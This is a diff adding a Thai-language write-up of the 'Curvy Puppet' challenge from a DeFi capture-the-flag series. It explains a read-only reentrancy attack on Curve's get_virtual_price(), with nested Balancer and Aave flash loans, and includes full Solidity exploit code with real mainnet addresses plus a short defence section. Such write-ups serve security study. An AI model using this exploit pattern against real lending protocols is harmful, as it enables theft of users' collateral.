@@ -525,3 +525,123 @@ by tinamints
     }
 }`
 
+
+
+## 17. Curvy Puppet
+### เงื่อนไข :
+- ปิด position ของผู้ใช้ทั้ง 3 คน (alice/bob/charlie) ในสัญญา lending ให้หมด (ทั้ง collateral และ borrow ต้องเป็น 0)
+- treasury ต้องยังเหลือ WETH และ LP อยู่บ้าง และต้องได้ DVT ของผู้ใช้ทั้ง 3 คนครบ (7500)
+- player ต้องไม่เหลืออะไรเลย
+### คอนเซ็ป :
+-  read-only reentrancy (Curve `get_virtual_price()`)
+-  การปั่นราคา oracle ของ borrow asset
+-  flash loan ซ้อนกัน (Balancer + Aave)
+### วิธีแก้ :
+- สัญญา lending ตีราคา borrow asset (LP token ของ Curve stETH/ETH) ด้วยสูตร `ETH_price * get_virtual_price()` ซึ่ง `remove_liquidity` ของ Curve pool รุ่นเก่าจะ burn LP supply ก่อน แล้วค่อย raw-call ส่ง ETH กลับมาให้ผู้เรียก **ก่อน** ที่ balance ของ pool จะถูกอัปเดตเสร็จ ทำให้ `get_virtual_price()` อ่านค่าที่ถูกปั่นให้สูงเกินจริงในช่วง callback ที่รับ ETH นั้น (read-only reentrancy) และเพราะ LP token เป็น *borrow asset* ของผู้ใช้ ราคา LP ที่พองขึ้นจึงทำให้มูลค่าหนี้ของทุกคนพองตาม ดัน position ที่เดิมมีหลักประกันเกินพอ 3 อันให้กลายเป็น liquidate ได้
+- เงื่อนไข liquidate จะเข้าเมื่อ `collateralValue*100 < borrowValue*175` โดย collateral = 2500 DVT ที่ $10 และ borrow = 1 LP จึงต้องดันให้ `virtual_price > 3.5714e18` (ค่าปกติอยู่ที่ ~1.1e18)
+- ขั้นตอน: กู้ flash loan WETH+wstETH จาก Balancer (วงนอก ไม่มีค่าธรรมเนียม) และ Aave (วงใน) → unwrap/withdraw เป็น ETH+stETH → `add_liquidity` ก้อนใหญ่มากที่จงใจให้ stETH เยอะ (ค่า spike แปรตามฝั่ง stETH) → `remove_liquidity` → ในฟังก์ชัน `receive()` ที่รับ ETH ตอนนั้น virtual_price ถูกปั่นขึ้นแล้ว จึง `liquidate()` ผู้ใช้ทั้ง 3 คน (จ่าย 1 LP ต่อคนจาก 6.5 LP ของ treasury และได้ 2500 DVT ต่อคน)
+- การใช้หนี้: เพราะฝากแบบ ETH น้อย เงินที่ได้คืนจึงเป็น ETH เยอะ / stETH น้อย เหลือ ETH เกินและขาด wstETH ที่มูลค่าใกล้เคียงกัน จึงกัน WETH ที่ต้องจ่ายไว้ก่อน แล้วแปลง ETH ที่เหลือเป็น stETH ผ่าน Lido (เก็บ reserve ไว้นิดหน่อยให้ treasury ยังมี WETH) แล้ว wrap เพื่อให้ครบ wstETH ที่ต้องจ่าย ต้นทุนหลักคือค่าธรรมเนียม Aave ~0.05% ซึ่งกินจากเงินสำรอง 200 WETH ของ treasury จึงต้องกู้ wstETH ไม่ให้เยอะเกินไป
+### การป้องกัน :
+- อย่าอ่าน `get_virtual_price()` (หรือ state ใด ๆ ของ pool) ในจังหวะที่ยังส่ง control ให้ผู้เรียกที่ไม่น่าเชื่อถือได้ — ใช้ oracle ที่ทนต่อการปั่นราคา หรือใส่ reentrancy lock ให้กับ view (ภายหลัง Curve ได้เพิ่มการป้องกัน reentrancy ให้ `remove_liquidity`) และอย่าตีราคาสินทรัพย์กู้ยืมจาก virtual price ณ จุดเดียว
+### POC
+` function test_curvyPuppet() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(
+            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
+        );
+        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
+        exploit.run();
+    }`
+
+`contract Exploit {
+    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
+    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+
+    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
+    uint256 constant BAL_WETH   = 37_000e18;
+    uint256 constant BAL_WSTETH = 12_000e18;
+    // stETH เยอะ: ปรับให้ virtual_price เกิน ~3.5714e18 (threshold ของการ liquidate)
+    uint256 constant AAVE_WETH   = 83_000e18;
+    uint256 constant AAVE_WSTETH = 140_000e18;
+    uint256 constant ETH_RESERVE = 20e18; // ETH ที่กันไว้ให้ treasury ยังมี WETH > 0
+
+    // ... immutables + constructor เก็บ lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users
+    enum State { NONE, LIQUIDATING }
+    State state;
+
+    function run() external {
+        // OUTER loan: Balancer (เรียง token น้อยไปมาก: wstETH < WETH)
+        address[] memory tokens = new address[](2);
+        uint256[] memory amounts = new uint256[](2);
+        tokens[0] = address(wstETH); tokens[1] = address(weth);
+        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
+        balancer.flashLoan(address(this), tokens, amounts, "");
+
+        // คืนทุกอย่างให้ treasury
+        weth.deposit{value: address(this).balance}();
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
+        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
+        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
+    }
+
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
+        require(msg.sender == address(balancer), "not balancer");
+        // INNER loan: Aave (ทั้งสอง asset), modes [0,0] = คืนเต็มจำนวน
+        address[] memory assets = new address[](2);
+        uint256[] memory amts = new uint256[](2);
+        uint256[] memory modes = new uint256[](2);
+        assets[0] = address(weth);  assets[1] = address(wstETH);
+        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
+        (bool ok,) = aavePool.call(abi.encodeWithSignature(
+            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
+            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
+        require(ok, "aave flashloan failed");
+        // คืน Balancer (ไม่มีค่าธรรมเนียม)
+        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
+        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
+    }
+
+    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
+        address initiator, bytes calldata) external returns (bool) {
+        require(msg.sender == aavePool && initiator == address(this));
+        // 1) แปลง token ที่กู้มาทั้งหมด -> coin ของ pool (ETH + stETH)
+        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
+        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
+        stETH.approve(address(curvePool), type(uint256).max);
+        // 2) add liquidity ก้อนใหญ่ (stETH เยอะ)
+        uint256 stEthAmount = stETH.balanceOf(address(this));
+        uint256 ethForLp = address(this).balance;
+        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
+        // 3) ให้ lending ดึง LP ของเราตอน liquidate()
+        IERC20(lpToken).approve(address(permit2), type(uint256).max);
+        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
+        // 4) remove -> pool raw-call ส่ง ETH เข้า receive() -> ช่วง liquidate
+        state = State.LIQUIDATING;
+        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
+        state = State.NONE;
+        // 5) ใช้หนี้: ETH ส่วนเกิน -> stETH -> wstETH เพื่อชดเชยส่วนที่ขาด
+        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
+        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
+        weth.deposit{value: wethOwed}();
+        uint256 ethBal = address(this).balance;
+        if (ethBal > ETH_RESERVE) {
+            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
+                abi.encodeWithSignature("submit(address)", address(0)));
+            require(ok, "lido submit failed");
+        }
+        stETH.approve(address(wstETH), type(uint256).max);
+        wstETH.wrap(stETH.balanceOf(address(this)));
+        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
+        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
+        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
+        return true;
+    }
+
+    receive() external payable {
+        if (state != State.LIQUIDATING) return;
+        // virtual_price ถูกปั่นขึ้นแล้ว (read-only reentrancy) -> liquidate ได้ทุก position
+        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
+    }
+}`
